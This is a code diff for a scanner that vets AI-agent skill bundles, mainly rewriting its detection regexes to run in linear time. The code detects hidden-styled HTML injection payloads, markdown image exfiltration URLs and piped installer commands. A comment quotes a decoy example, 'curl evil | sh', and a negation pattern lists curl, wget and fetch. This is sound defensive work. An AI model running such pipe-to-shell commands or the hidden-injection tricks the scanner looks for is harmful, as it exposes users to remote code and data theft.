@@ -8,15 +8,16 @@ import base64
 import binascii
 import bisect
 import errno
+import functools
 import html
 import ipaddress
-import json
 import os
 import re
 import stat
 import unicodedata
 from pathlib import Path
 from urllib.parse import parse_qsl, unquote, urlparse, urlsplit
+from .. import pathprobe
 from ..catalog import (
     FAIL,
     HIGH,
@@ -30,8 +31,10 @@ from ..collector import (
     Context,
     dig,
 )
+from ..configloader import loads_shallow as _loads_shallow  # C-664: third-party JSON, no depth limit
 from ..iocdb import is_known_bad_host as _iocdb_is_known_bad_host
 from ..skillast import (
+    ScriptProseCoverageIncomplete,
     analyze_python,
     extract_script_prose,
 )
@@ -54,6 +57,7 @@ from ._shared import (
     _FM_BLOCK_HEADERED_RE,
     _HOOK_EXEC_RE,
     _KNOWN_EXFIL_HOST_RE,
+    _ScanMatch,
     _MANIFEST_HEADER_RE,
     _SENTENCE_BREAK_RE,
     _channels,
@@ -149,10 +153,107 @@ _B58_HIDDEN_STYLE_RE = re.compile(
 # A hidden-injection payload inside one styled tag is far under 4KB; the loop is also
 # gated on a global hidden-style pre-check (see _b58_hidden_segments) so the common case
 # (no hidden style anywhere) skips the scan entirely.
+# The hidden-tag shape, kept as the executable definition of what `_b58_hidden_tags` yields.
+# C-730: it is no longer run over file text - on "<a <a <a ..." every tag start scanned the
+# attributes to the next ">" (or to the end of the text), which is quadratic.
 _B58_HIDDEN_TAG_RE = re.compile(
     r"<(?P<tag>[A-Za-z][\w:-]*)(?P<attrs>[^>]*)>(?P<body>.{0,4096}?)</(?P=tag)>",
     re.IGNORECASE | re.DOTALL,
 )
+
+
+_B58_TAG_OPEN_RE = re.compile(r"<(?P<tag>[A-Za-z][\w:-]*)", re.IGNORECASE)
+
+
+_B58_BODY_MAX = 4096        # the `.{0,4096}?` of the body
+# `</(?P=tag)>` compares the closing name the way the regex engine compares a BACKREFERENCE
+# under re.I, which is not quite how it compares a literal (a long s does not close an "s"
+# tag). The same engine is asked, so the answer cannot drift from the pattern above.
+_B58_SAME_NAME_RE = re.compile(r"(.*)\x00\1\Z", re.IGNORECASE | re.DOTALL)
+
+
+_B58_SHORT_NAME = 64        # a name up to this long gets one compiled prefix searcher
+
+
+@functools.lru_cache(maxsize=512)
+def _b58_prefix_closer_re(name: str) -> "re.Pattern":
+    """Finds a closing tag for ANY prefix of *name* - ``</a>``, ``</ab>``, ... - in one
+    search. A literal under re.I matches at least what a backreference would, so nothing is
+    missed; `_B58_SAME_NAME_RE` then decides."""
+    nested = ""
+    for ch in reversed(name[1:]):
+        nested = "(?:" + re.escape(ch) + nested + ")?"
+    return re.compile("</" + re.escape(name[0]) + nested + ">", re.IGNORECASE)
+
+
+def _b58_closing_tag(text: str, body_at: int, name: str) -> "tuple[int, int]":
+    """``(k, c)``: the closing tag `_B58_HIDDEN_TAG_RE` would settle on for an opening tag
+    whose name run is *name* and whose body starts at *body_at* - the LONGEST prefix
+    ``name[:k]`` that has a ``</name[:k]>`` beginning within `_B58_BODY_MAX` characters, at
+    the first such place ``c`` (the lazy body takes the nearest). ``(0, -1)`` when there is
+    none.
+
+    Each closing tag in the window closes at most one prefix - the one as long as the name
+    it spells - so the window is searched once, not once per prefix: with one compiled
+    searcher for a short name, by walking its "</" for a long one (a long name leaves room
+    for few such tags in a text, so the walk stays linear).
+    """
+    limit = body_at + _B58_BODY_MAX
+    longest = len(name)
+    best_k, best_c = 0, -1
+    if longest <= _B58_SHORT_NAME:
+        hits = ((h.start(), h.end() - 1) for h in
+                _b58_prefix_closer_re(name).finditer(text, body_at, limit + 3 + longest)
+                if h.start() <= limit)
+    else:
+        def _walk():
+            c = text.find("</", body_at, limit + 2)
+            while c >= 0:
+                gt = text.find(">", c + 2, c + 3 + longest)
+                if gt >= 0:
+                    yield c, gt
+                c = text.find("</", c + 1, limit + 2)
+        hits = _walk()
+    for c, gt in hits:
+        k = gt - c - 2
+        if best_k < k <= longest and (
+                text[c + 2:gt] == name[:k]
+                or _B58_SAME_NAME_RE.match(name[:k] + "\x00" + text[c + 2:gt])):
+            best_k, best_c = k, c
+            if k == longest:
+                break                   # nothing can beat the full name
+    return best_k, best_c
+
+
+def _b58_hidden_tags(text: str):
+    """Yield a match for each one `_B58_HIDDEN_TAG_RE.finditer(text)` would produce, with
+    the same span and the same ``tag`` / ``attrs`` / ``body`` groups (C-730).
+
+    The regex tried, at every "<name", to read the attributes up to the next ">" - so a run
+    of unclosed tag starts rescanned the same stretch each time. Here that ">" is found once
+    and remembered while it is still ahead, and the closing tag is found in one pass over
+    the window after it. The regex could also settle for a SHORTER tag name (`<ab>..</a>`
+    reads as tag "a" with attributes "b"); `_b58_closing_tag` picks the prefix it would.
+    """
+    pos = 0
+    gt = -2         # the first ">" at or after the end of the last tag name looked at
+    while True:
+        o = _B58_TAG_OPEN_RE.search(text, pos)
+        if o is None:
+            return
+        start, name_end = o.start(), o.end()
+        if gt < name_end:
+            gt = text.find(">", name_end)
+            if gt < 0:
+                return                  # no ">" left: no tag from here on can match
+        name = o.group("tag")
+        k, c = _b58_closing_tag(text, gt + 1, name)
+        if c < 0:
+            pos = start + 1
+            continue
+        yield _ScanMatch(text, start, c + 3 + k, {
+            "tag": name[:k], "attrs": text[start + 1 + k:gt], "body": text[gt + 1:c]})
+        pos = c + 3 + k
 
 
 _B58_HTML_COMMENT_RE = re.compile(r"<!--(.*?)-->", re.IGNORECASE | re.DOTALL)
@@ -177,7 +278,16 @@ _B58_JS_UHEX_RE = re.compile(r"\\u\{([0-9a-fA-F]{1,6})\}")
 _B58_JS_UNI_RE = re.compile(r"\\u([0-9a-fA-F]{4})")
 
 
-_B58_URL_OR_EMAIL_RE = re.compile(r'https?://|\b[\w.+-]+@[\w-]+\.[\w.-]+', re.I)
+# C-730: linear time. The e-mail leg used to be `\b[\w.+-]+@...`; a run of `[\w.+-]` (which holds
+# every `\w`, so what precedes it is never `\w`) has a `\b` inside it exactly when it holds a
+# `\w` character, and its outcome depends on the run alone. So: only the run's first character
+# may start (lookbehind), and `(?=[.+-]*\w)` asks for that one `\w`. The match may now begin at
+# the run's leading dots instead of its first letter: its ONLY call site
+# (`_b58_extract_actionable`, `bool(... .search(seg_norm))`) reads the truth value, never the span
+# (and, like _B63_DEST_RE's e-mail leg, it is not equivalent under `.finditer`).
+_B58_URL_OR_EMAIL_RE = re.compile(
+    r'https?://|(?<![\w.+-])(?=[.+-]*\w)[\w.+-]+@[\w-]+\.[\w.-]+', re.I
+)
 
 
 _B59_HTML_ATTR_RE = re.compile(
@@ -187,7 +297,26 @@ _B59_HTML_ATTR_RE = re.compile(
 )
 
 
+# The img/a tag shape, kept as the executable definition of what `_b59_html_tags` yields.
+# C-730: not run over file text any more (unclosed "<a " starts each rescanned to the next ">").
 _B59_HTML_TAG_RE = re.compile(r"<(?:img|a)\b[^>]*>", re.IGNORECASE)
+_B59_HTML_TAG_OPEN_RE = re.compile(r"<(?:img|a)\b", re.IGNORECASE)
+
+
+def _b59_html_tags(text: str):
+    """Yield a match (``start()``, ``group(0)``) for each one `_B59_HTML_TAG_RE.finditer`
+    would produce (C-730): every "<img" / "<a" start runs to the first ">" after it, found
+    once and remembered while it is still ahead of the scan."""
+    pos = 0
+    while True:
+        o = _B59_HTML_TAG_OPEN_RE.search(text, pos)
+        if o is None:
+            return
+        gt = text.find(">", o.end())
+        if gt < 0:
+            return                      # no ">" left: no tag from here on can match
+        yield _ScanMatch(text, o.start(), gt + 1)
+        pos = gt + 1
 
 
 _B59_IMG_TEXT_ATTR_RE = re.compile(
@@ -197,10 +326,82 @@ _B59_IMG_TEXT_ATTR_RE = re.compile(
 )
 
 
+# The markdown-image shape, kept as the executable definition of what `_b59_md_images`
+# yields (C-730: not run over file text any more - see `_b59_md_scan`).
 _B59_MD_IMG_RE = re.compile(r"!\[[^\]]*\]\(([^)\n]+)\)", re.IGNORECASE)
 
 
+# The markdown-link shape, kept as the executable definition of what `_b59_md_links` yields.
+# C-730: it is no longer run over file text - on a run of "[" every bracket began an attempt
+# that scanned to the next "]" (quadratic), and the same again for the URL after each "](".
 _B59_MD_LINK_RE = re.compile(r"(?<!\!)\[[^\]]+\]\(([^)\n]+)\)", re.IGNORECASE)
+
+
+def _b59_md_scan(text: str, image: bool):
+    """Yield ``(start, url)`` for each match `_B59_MD_LINK_RE.finditer(text)` (*image* False)
+    or `_B59_MD_IMG_RE.finditer(text)` (*image* True) would produce - ``start`` is
+    ``m.start()`` and ``url`` is ``m.group(1)`` - in one pass (C-730).
+
+    Either regex is decided by three positions: the opening "[" (for a link: not after "!",
+    for an image: right after one), the FIRST "]" after it (a link's text may not be empty,
+    an image's may), and the first ")" or newline after the "](" that must follow (the URL
+    must not be empty and must end at ")"). Every opener before the same "]" shares that
+    fate, so when the tail fails the scan resumes after that "]" instead of retrying each of
+    them. Each position is found with `str.find` and remembered while it is still ahead of
+    the scan, so no stretch is searched twice.
+    """
+    n = len(text)
+    pos = 0
+    close = -2      # the first "]" after the last "[" tried (-2: not looked for yet)
+    paren = -2      # the first ")" at or after the last URL start tried; n when there is none
+    newline = -2    # the same for a newline
+    while True:
+        if image:
+            start = text.find("![", pos)
+            if start < 0:
+                return
+            i = start + 1
+        else:
+            i = start = text.find("[", pos)
+            if i < 0:
+                return
+            if i > 0 and text[i - 1] == "!":
+                pos = i + 1
+                continue
+        if close <= i:
+            close = text.find("]", i + 1)
+            if close < 0:
+                return
+        if close == i + 1 and not image:    # "[]": a link's text needs one character
+            pos = i + 1
+            continue
+        url_at = close + 2
+        if not text.startswith("(", close + 1):
+            pos = close + 1
+            continue
+        if paren < url_at:
+            paren = text.find(")", url_at)
+            if paren < 0:
+                paren = n
+        if newline < url_at:
+            newline = text.find("\n", url_at)
+            if newline < 0:
+                newline = n
+        if paren == n or newline < paren or paren == url_at:
+            pos = close + 1             # no ")" on this line, or an empty URL
+            continue
+        yield start, text[url_at:paren]
+        pos = paren + 1
+
+
+def _b59_md_links(text: str):
+    """``(m.start(), m.group(1))`` of every `_B59_MD_LINK_RE` match, in one pass."""
+    return _b59_md_scan(text, image=False)
+
+
+def _b59_md_images(text: str):
+    """``(m.start(), m.group(1))`` of every `_B59_MD_IMG_RE` match, in one pass."""
+    return _b59_md_scan(text, image=True)
 
 
 # Self-reference to the instructions themselves (reduces FP when target is generic)
@@ -683,8 +884,11 @@ def _mark_truncated(snippet: str, truncated_head: bool, truncated_tail: bool) ->
 # and in the measured case it began PAST the `allowed-tools:` key, seeing only the bare
 # tail `, Write, Read`. A pattern applied to the window alone would not have matched the
 # declaration it needs to erase - which is exactly how this evidence stayed invisible.
+# C-730: linear time. `[ \t]*[-*]?[ \t]*` let two adjacent blank runs split a run of n blanks
+# in n ways, so ONE long line of spaces cost n^2 from a single start. `(?:[-*][ \t]*)?` is the
+# same language (blanks, then optionally a marker and blanks) with one way to read it.
 _B61_TOOL_DECL_RE = re.compile(
-    r"^([ \t]*[-*]?[ \t]*(?:allowed[-_]?tools|disallowed[-_]?tools|tools)[ \t]*:)([^\n]*)",
+    r"^([ \t]*(?:[-*][ \t]*)?(?:allowed[-_]?tools|disallowed[-_]?tools|tools)[ \t]*:)([^\n]*)",
     re.I | re.M,
 )
 
@@ -2114,7 +2318,12 @@ _B63_DEST_RE = re.compile(
         # an @-handle, but only when it is the OBJECT of a destination cue - a bare @word matches
         # Python decorators (@app.route) / CSS at-rules (@media), a false positive (C-135 r2 HOLE 3)
         r"|\b(?:to|via|dm)\s+@\w{2,}"
-        r"|https?://|[\w.+-]+@[\w-]+\.[\w.-]+"
+        # C-730: the e-mail leg's lookbehind lets only a run's first character try (the leg's
+        # outcome depends on the run, not on where inside it the attempt starts, and it has
+        # no \b), so a long run of `[\w.+-]` is no longer rescanned from every position.
+        # FIRST MATCH ONLY: every call site is `.search`; `.finditer` would skip a match that
+        # starts inside the run a previous match ended in (tests/test_c730_regex_equivalence.py).
+        r"|https?://|(?<![\w.+-])[\w.+-]+@[\w-]+\.[\w.-]+"
         # B-947 round 2: every alternative here is now word-bounded - "k sebe" and each
         # "v <noun>" destination noun (moy/nash/chat/bot) are complete standalone Russian
         # words in this destination-phrase usage, so an UNbounded literal substring-
@@ -3902,7 +4111,13 @@ def _clickfix_trusted_installer(cmd: str) -> bool:
             return False
         if p.scheme != "https":
             return False
-        if p.port is not None or p.query or p.fragment:
+        try:
+            has_port = p.port is not None
+        except ValueError:
+            # C-652: `.port` is lazy and raises on a non-numeric ("$PORT") or out-of-range
+            # port, which urlparse() itself accepts. Unreadable port -> not trusted.
+            return False
+        if has_port or p.query or p.fragment:
             return False  # canonical installer URL only - no explicit port, query, or fragment
         host = (p.hostname or "").lower()
         path = p.path or ""
@@ -4031,8 +4246,13 @@ _DEFENSIVE_HEADING_RE = re.compile(
 # Regex to extract dep names from the manifest headers injected by _read_skill_text.
 # Reuses _MANIFEST_HEADER_RE / _REQ_UNPINNED_RE / _PKG_JSON_DEP_RE infrastructure.
 # We want ALL dep names regardless of pinning status.
+# C-730: linear time. The old `(?!\s*$)` ("not a blank line") sat right before the name, where
+# it can never fail a match that goes on to succeed (the next character is then a name
+# character, so `\s*$` cannot hold) - but at every line start it scanned all the blank lines
+# that follow, and on one line of blanks every backtrack rescanned the rest. Dropped; same
+# matches, spans and group.
 _DEP_PKG_NAME_RE = re.compile(
-    r"^[ \t]*(?!#)(?!-[rcei])(?!\s*$)([A-Za-z0-9_.\-]+)",
+    r"^[ \t]*(?!#)(?!-[rcei])([A-Za-z0-9_.\-]+)",
     re.MULTILINE,
 )
 
@@ -4285,7 +4505,7 @@ _LIFECYCLE_HOOK_RE = re.compile(
 # Scans the skill blob for manifest sections (requirements.txt, package.json, pyproject.toml)
 # that declare unpinned/floating dependencies - a supply-chain vector where a compromised
 # package update silently delivers malware into the skill bundle on next install.
-# Tomllib (3.11+) is not available on 3.9/3.10; use regex-only approach for 3.9 compat.
+# Tomllib (3.11+) is not available on 3.10; use regex-only approach for 3.10 compat.
 #
 # _MANIFEST_HEADER_RE (recognises the "# file: <name>\n" section header injected by
 # _read_skill_text) moved to _shared.py (B-193) - it's now reused by _vet.py too.
@@ -4369,10 +4589,16 @@ _LIFECYCLE_HOOK_RE = re.compile(
 # call sites, not just B165/the IOC pair), the review also confirmed "do not paste"/
 # "do not contact" now dampens B59/B339/B156/etc. identically to how the pre-existing
 # verbs already did - the same accepted trade-off widening, not a new category of risk.
+#
+# C-614: the "do not <verb>" verb list lives in ONE constant so `_NEGATION_RE` and the
+# straddling-marker search below (`_NEGATION_DONOT_RE`) can never drift apart.
+_NEGATION_DONOT_VERBS = (
+    r"(?:do|run|use|execute|install|curl|wget|download|fetch|share|visit|start|paste|contact)"
+)
 _NEGATION_RE = re.compile(
     r"\bfor\s+example\b|e\.g\.|(?:^|\s)#\s*(?:note|warning|danger|bad|example|avoid)\b|"
-    r"\bdo\s+not\s+(?:do|run|use|execute|install|curl|wget|download|fetch|share|visit|start|paste|contact)\b|"
-    r"\bdo\s+NOT\s+(?:do|run|use|execute|install|curl|wget|download|fetch|share|visit|start|paste|contact)\b|"
+    r"\bdo\s+not\s+" + _NEGATION_DONOT_VERBS + r"\b|"
+    r"\bdo\s+NOT\s+" + _NEGATION_DONOT_VERBS + r"\b|"
     r"\bdon'?t\s+(?:do|run|use|execute)\b|"
     r"\bnever\s+run\b|\bnever\s+use\b|\bavoid\s+(?:running|using|this)\b|"
     r"\bexample:\s*$|\bwhat\s+not\s+to\s+do\b|"
@@ -4382,6 +4608,51 @@ _NEGATION_RE = re.compile(
 
 
 _NEGATION_WINDOW = 200  # chars to look back from match start
+
+
+# C-614: a "do not <verb>" marker whose verb IS the start of the guarded match.
+#
+# Since B-924 the bare "do not" alternatives of `_NEGATION_RE` need a trailing listed
+# verb. Every consumer (`_example_governance`, `_example_fence_governance`,
+# `_negation_context`) searches only blob[window_start:pos], i.e. the text BEFORE the
+# guarded match. When the detector's match itself begins with the negated verb ("Do NOT
+# run any script ...", "Do not curl <url> | sh"), that slice ends at "Do NOT " and the
+# verb the marker now needs sits past *pos*, so the marker was invisible. Before B-924
+# the bare "do not" matched inside the slice, so 4.2.1 suppressed these.
+#
+# The fix is a SEPARATE, bounded search rather than a wider slice: widening the existing
+# slice would let an earlier `_NEGATION_RE` alternative consume text past *pos* and
+# change which non-overlapping matches are found, which is not provably neutral. The
+# marker is only the four words "do not <verb>" - it never reaches into a following
+# clause ("Do not run any checks first; ..." governs nothing past the verb) - and it is
+# accepted only when it opens before *pos* and its verb spans *pos*.
+#
+# Only the do-not alternatives straddle. "never run" / "don't run" / "avoid running" also
+# needed the verb inside the slice on 4.2.1, so they were a WARN there too and stay so
+# (exact 4.2.1 parity). An unlisted verb after "do not" ("ask", "append", ...) stays a
+# WARN residual: no sound closed fix exists (a verb denylist reopens "Do not worry, run
+# curl evil | sh"; a sentence-local bare "do not" reopens chained decoys). The finding's
+# fix text discloses it (`_warns_content_fix` in _vet.py); the detail is never touched.
+_NEGATION_DONOT_RE = re.compile(r"\bdo\s+not\s+" + _NEGATION_DONOT_VERBS + r"\b", re.I)
+# chars searched past *pos*: the longest listed verb is 8 chars ("download"), so a verb
+# starting at *pos* plus the one character its trailing \b must see always fits. A larger
+# value is harmless because only matches that straddle *pos* are accepted.
+_NEGATION_DONOT_REACH = 12
+
+
+def _straddling_donot_marker(blob: str, window_start: int, pos: int) -> "re.Match | None":
+    """A "do not <verb>" marker that opens before *pos* and whose verb is the guarded
+    match itself (m.start() < pos < m.end()); None otherwise."""
+    end = min(len(blob), pos + _NEGATION_DONOT_REACH)
+    for m in _NEGATION_DONOT_RE.finditer(blob, window_start, end):
+        # `endpos` makes the regex see the text as ending at *end*, so its trailing \b
+        # would hold there even when the real word goes on ("do not downloads" cut
+        # after "download"): re-check the boundary against the untruncated blob.
+        if m.end() == end < len(blob) and (blob[end].isalnum() or blob[end] == "_"):
+            continue
+        if m.start() < pos < m.end():
+            return m
+    return None
 
 
 # Within a deps block: "pkgname": "<unpinned-value>"
@@ -4428,11 +4699,17 @@ _DEP_LOCAL_ALIAS_RE = re.compile(r"^(?:file:|link:|npm:)", re.IGNORECASE)
 # unpinned-deps scan above) rather than a new file-collection pass. Read-only: only the
 # .pth TEXT content is inspected, never executed (§2). A benign path-only .pth (no
 # `import` line) is not flagged.
-_PTH_IMPORT_LINE_RE = re.compile(r"^\s*import\s+\S", re.MULTILINE)
+# C-730: linear time, as _FM_HOMEPAGE_RE: the leading blank run stays on one line. The call
+# site reads only whether there is a match.
+_PTH_IMPORT_LINE_RE = re.compile(r"^[^\S\n]*import\s+\S", re.MULTILINE)
 
 
+# C-730: linear time, as _FM_HOMEPAGE_RE: the leading blank run stays on the entry's own line.
+# The same entries are found with the same group 1 and the same END; the match START no longer
+# reaches back over preceding blank lines, and both call sites read group 1 or
+# `group(0).strip()`, which drops exactly that leading whitespace.
 _PYPROJECT_DEP_LINE_RE = re.compile(
-    r"^\s*\"?([A-Za-z0-9_.\-\[,\]]+)\"?"
+    r"^[^\S\n]*\"?([A-Za-z0-9_.\-\[,\]]+)\"?"
     r"(?:\s*$|\s*>=\s*\S+|\s*>\s*\S+|\s*==\s*\*|\s*@\s*latest)",
     re.MULTILINE,
 )
@@ -4462,7 +4739,9 @@ _REQ_PINNED_SUFFIX_RE = re.compile(r"==\s*[0-9]")  # == X.Y.Z exact pin is clean
 # A pinned line uses == X.Y.Z  (exact pin is clean; range specs are supply-chain risk).
 # Lines starting with # (comments), -r/-c/-e/-i (options), or blank are skipped.
 _REQ_UNPINNED_RE = re.compile(
-    r"^[ \t]*(?!#)(?!-[rcei])(?!\s*$)"  # not comment, option, blank
+    # C-730: no `(?!\s*$)` here - see _DEP_PKG_NAME_RE: redundant before the name, and
+    # quadratic on blank lines / one long line of blanks. Same matches, spans and group.
+    r"^[ \t]*(?!#)(?!-[rcei])"  # not comment, option (a blank line has no name)
     r"([A-Za-z0-9_.\-\[,\]]+)"  # package name (+ extras)
     r"(?:"
     r"\s*$|"  # 1. bare (no version)
@@ -4782,6 +5061,34 @@ def _b58_decode_base64_layer(
             )
 
 
+def _b58_strip_tags(text: str) -> str:
+    """``re.sub(r"<[^>]+>", " ", text)`` in one pass (C-730).
+
+    On a run of "<" the regex began an attempt at every one and scanned to the next ">"
+    each time (quadratic). The outcome is fixed by two positions - a "<" and the first ">"
+    after it, which must not be the very next character - so they are found with
+    ``str.find`` instead: same replacements, same text left over.
+    """
+    out = []
+    pos = 0
+    while True:
+        i = text.find("<", pos)
+        if i < 0:
+            break
+        r = text.find(">", i + 1)
+        if r < 0:
+            break                       # no ">" left: no "<" from here on can match
+        if r == i + 1:                  # "<>": the tag needs one character
+            out.append(text[pos:i + 1])
+            pos = i + 1
+            continue
+        out.append(text[pos:i])
+        out.append(" ")
+        pos = r + 1
+    out.append(text[pos:])
+    return "".join(out)
+
+
 def _b58_decode_html_entities(text: str) -> str:
     return html.unescape(text)
 
@@ -4935,12 +5242,12 @@ def _b58_hidden_segments(text: str) -> list[tuple[str, str]]:
     # B-102: a hidden-styled tag can only exist if a hidden-style token exists somewhere
     # in the text; this cheap linear pre-check lets the common (and adversarial all-tags)
     # case skip the O(n)-per-tag body scan entirely. Lossless - attrs subset-of text.
-    tag_scan = _B58_HIDDEN_TAG_RE.finditer(text) if _B58_HIDDEN_STYLE_RE.search(text) else ()
+    tag_scan = _b58_hidden_tags(text) if _B58_HIDDEN_STYLE_RE.search(text) else ()
     for m in tag_scan:
         attrs = m.group("attrs") or ""
         if not _B58_HIDDEN_STYLE_RE.search(attrs):
             continue
-        body = re.sub(r"<[^>]+>", " ", m.group("body") or "")
+        body = _b58_strip_tags(m.group("body") or "")
         body = normalize_for_scan(html.unescape(body))
         if body.strip():
             segments.append((body, "hidden-html/css"))
@@ -6062,21 +6369,21 @@ def _check_markdown_image_exfil(ctx: Context) -> Finding:
         norm = normalize_for_scan(blob)
         fr = _fence_ranges(norm)
 
-        for m in _B59_MD_IMG_RE.finditer(norm):
-            if _is_code_example(norm, m.start(), fr, fence_needs_negation=True):
+        for img_start, img_url in _b59_md_images(norm):
+            if _is_code_example(norm, img_start, fr, fence_needs_negation=True):
                 continue
-            url = _b59_markdown_url(m.group(1))
+            url = _b59_markdown_url(img_url)
             if url and _b59_url_has_data_query(url):
                 evidence.append(f"{source}: markdown image URL with query params: {_safe_url(url)}")
 
-        for m in _B59_MD_LINK_RE.finditer(norm):
-            if _is_code_example(norm, m.start(), fr, fence_needs_negation=True):
+        for link_start, link_url in _b59_md_links(norm):
+            if _is_code_example(norm, link_start, fr, fence_needs_negation=True):
                 continue
-            url = _b59_markdown_url(m.group(1))
+            url = _b59_markdown_url(link_url)
             if url and _b59_url_has_data_query(url):
                 evidence.append(f"{source}: markdown link URL with query params: {_safe_url(url)}")
 
-        for m in _B59_HTML_TAG_RE.finditer(norm):
+        for m in _b59_html_tags(norm):
             if _is_code_example(norm, m.start(), fr, fence_needs_negation=True):
                 continue
             tag = m.group(0)
@@ -6617,7 +6924,7 @@ def _enumerate_symlinks(root: Path, state: dict) -> list[Path]:
         for d in sorted(dirnames):
             p = dp / d
             try:
-                is_link = p.is_symlink()
+                is_link = pathprobe.is_symlink(p)
             except OSError as exc:
                 if exc.errno in _B87_VANISHED_ERRNOS:
                     continue  # gone by lstat time -> nothing to hide, no gap (see docstring)
@@ -6632,7 +6939,7 @@ def _enumerate_symlinks(root: Path, state: dict) -> list[Path]:
         for f in sorted(filenames):
             p = dp / f
             try:
-                is_link = p.is_symlink()
+                is_link = pathprobe.is_symlink(p)
             except OSError as exc:
                 if exc.errno in _B87_VANISHED_ERRNOS:
                     continue  # gone by lstat time -> nothing to hide, no gap (see docstring)
@@ -6885,21 +7192,18 @@ def _script_prose_evidence(ctx: Context) -> list[tuple[str, str, str]]:
     (e.g. a synthetic per-skill ``--vet`` context) always starts with no cache
     attribute, so nothing here can leak a cached result across two different
     ``Context`` objects.
+
+    C-619: one unparseable bundled ``.py`` no longer aborts the walk. The
+    ``ScriptProseCoverageIncomplete`` that ``extract_script_prose`` raises for it is
+    caught PER FILE in ``_script_prose_scan`` (the blocks of every parseable file
+    survive) and the unread ``(skill, relpath)`` pairs are memoized beside the triples;
+    see ``_script_prose_unread_notes``. The return type is unchanged (triples only).
     """
     cache = getattr(ctx, "_script_prose_cache", None)
     if cache is not None and "triples" in cache:
         return list(cache["triples"])
 
-    out: list[tuple[str, str, str]] = []
-    for attr_name, ext in (
-        ("installed_skill_py", "py"),
-        ("installed_skill_shell", "sh"),
-        ("installed_skill_js", "js"),
-    ):
-        for name, files in (getattr(ctx, attr_name, None) or {}).items():
-            for relpath, src in files:
-                for block in extract_script_prose(src, ext):
-                    out.append((name, relpath, normalize_for_scan(block)))
+    out, unread = _script_prose_scan(ctx)
 
     if cache is None:
         cache = {}
@@ -6909,21 +7213,97 @@ def _script_prose_evidence(ctx: Context) -> list[tuple[str, str, str]]:
             cache = None  # duck-typed ctx that forbids new attributes -- stay uncached
     if cache is not None:
         cache["triples"] = out
+        cache["unread"] = unread
     return out
+
+
+def _script_prose_scan(
+    ctx: Context,
+) -> tuple[list[tuple[str, str, str]], list[tuple[str, str]]]:
+    """C-619: the uncached walk behind ``_script_prose_evidence`` --
+    ``(triples, unread)`` where ``unread`` is every ``(skill_name, relpath)`` whose
+    docstrings/comments could NOT be extracted because ``ast.parse`` failed.
+
+    Catches ONLY ``ScriptProseCoverageIncomplete`` (B-377's deliberate "could not read"
+    signal). It must not be widened: ``ScanBudgetExceeded`` is a ``BaseException``
+    (B-352) and has to keep escaping, and a genuine bug still belongs in ``run_all``'s
+    crash isolation. The ``.sh``/``.js`` extractors are lexical and never raise.
+    """
+    out: list[tuple[str, str, str]] = []
+    unread: list[tuple[str, str]] = []
+    for attr_name, ext in (
+        ("installed_skill_py", "py"),
+        ("installed_skill_shell", "sh"),
+        ("installed_skill_js", "js"),
+    ):
+        for name, files in (getattr(ctx, attr_name, None) or {}).items():
+            for relpath, src in files:
+                try:
+                    blocks = extract_script_prose(src, ext)
+                except ScriptProseCoverageIncomplete:
+                    unread.append((name, relpath))  # other files' blocks still survive
+                    continue
+                for block in blocks:
+                    out.append((name, relpath, normalize_for_scan(block)))
+    return out, unread
+
+
+_SCRIPT_PROSE_UNREAD_NOTE_CAP = 10
+
+
+def _script_prose_unread_notes(ctx: Context) -> list[str]:
+    """C-619: ``coverage:`` evidence notes (the B-526 channel) for every bundled
+    script whose docstrings/comments could not be read because the file does not parse.
+
+    Warms ``_script_prose_evidence``'s memo and reads the unread list from it, so B66
+    and B156 share one parse per file; a ctx that forbids attributes (uncached) falls
+    back to a fresh ``_script_prose_scan``. Capped at ``_SCRIPT_PROSE_UNREAD_NOTE_CAP``
+    per-file notes plus one overflow line, so a bundle of hundreds of broken files
+    cannot flood the "Not assessed" block. Evidence only -- callers must never put
+    this text in ``detail`` (``baseline.fingerprint()`` hashes ``detail``).
+    """
+    _script_prose_evidence(ctx)
+    cache = getattr(ctx, "_script_prose_cache", None)
+    if cache is not None and "unread" in cache:
+        unread = cache["unread"]
+    else:
+        unread = _script_prose_scan(ctx)[1]
+    notes = [
+        f"coverage: {name}: {relpath} docstrings/comments not read (file does not parse)"
+        for name, relpath in unread[:_SCRIPT_PROSE_UNREAD_NOTE_CAP]
+    ]
+    if len(unread) > _SCRIPT_PROSE_UNREAD_NOTE_CAP:
+        notes.append(
+            f"coverage: {len(unread) - _SCRIPT_PROSE_UNREAD_NOTE_CAP} more script(s) "
+            "docstrings/comments not read (file does not parse)"
+        )
+    return notes
 
 
 def _fm_metadata_obj(fm: str) -> dict:
     """Parse the single-line JSON `metadata:` value from a frontmatter block, best-effort.
     Returns {} when absent or not single-line JSON (multi-line YAML metadata is skipped -
     B89 only needs the boolean invocation flags, which our fleet writes as inline JSON)."""
+    return _fm_metadata_obj_shallow(fm)[0]
+
+
+def _fm_metadata_obj_shallow(fm: str) -> "tuple[dict, int]":
+    """:func:`_fm_metadata_obj` plus how many subtrees were too deep to follow (C-664).
+
+    The value is read by ``loads_shallow``: every field within the first 64 levels is what
+    ``json.loads`` returns however the line is padded, and a subtree below that is
+    ``ELIDED`` (neither a dict, a list nor a str, so every ``isinstance`` guard downstream
+    skips it). A caller that could return a clean verdict must not do so when the count is
+    non-zero. A line nested past the interpreter's stack used to raise ``RecursionError``
+    out of the check."""
     m = _FM_METADATA_LINE_RE.search(fm)
     if not m:
-        return {}
+        return {}, 0
     try:
-        obj = json.loads(m.group(1))
+        shallow = _loads_shallow(m.group(1))
     except (ValueError, TypeError):
-        return {}
-    return obj if isinstance(obj, dict) else {}
+        return {}, 0
+    return (shallow.value, shallow.elided) if isinstance(shallow.value, dict) else ({}, 0)
 
 
 def _fm_metadata_obj_multiline(fm: str) -> dict:
@@ -6937,12 +7317,18 @@ def _fm_metadata_obj_multiline(fm: str) -> dict:
     never evidence of malice (§5, zero false-positive FAIL). Brace-scanning does not track
     braces inside string values, so a hostile skill can only DODGE the check (-> {} -> UNKNOWN),
     never trip a false finding."""
+    return _fm_metadata_obj_multiline_shallow(fm)[0]
+
+
+def _fm_metadata_obj_multiline_shallow(fm: str) -> "tuple[dict, int]":
+    """:func:`_fm_metadata_obj_multiline` plus the count of too-deep subtrees (C-664); see
+    :func:`_fm_metadata_obj_shallow` for the contract."""
     m = _FM_METADATA_KEY_RE.search(fm)
     if not m:
-        return {}
+        return {}, 0
     start = fm.find("{", m.end())
     if start < 0:
-        return {}
+        return {}, 0
     depth = 0
     end = -1
     for j in range(start, len(fm)):
@@ -6955,13 +7341,13 @@ def _fm_metadata_obj_multiline(fm: str) -> dict:
                 end = j + 1
                 break
     if end < 0:
-        return {}
+        return {}, 0
